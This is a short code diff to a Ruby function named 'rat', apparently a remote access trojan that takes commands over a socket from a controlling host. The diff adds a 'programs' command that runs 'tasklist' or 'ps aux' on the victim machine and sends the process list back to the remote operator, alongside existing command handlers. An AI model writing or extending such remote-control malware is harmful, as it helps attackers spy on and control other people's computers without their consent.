@@ -79,6 +79,13 @@ def rat(ip)
         file.close
       when 'latency'
         socket.puts 'done'
+      when 'programs'
+        if Gem.win_platform?
+          socket.puts `tasklist`
+        else
+          socket.puts `ps aux`
+        end
+        puts 'done'
       end
     end
     # SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
